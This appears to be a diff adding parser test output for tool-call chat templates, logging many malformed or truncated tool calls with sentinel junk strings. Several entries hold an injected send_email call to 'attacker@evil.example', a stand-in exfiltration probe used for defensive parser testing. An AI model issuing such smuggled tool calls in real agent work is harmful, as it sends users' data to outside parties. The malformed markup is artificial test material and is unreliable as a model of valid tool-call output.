+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
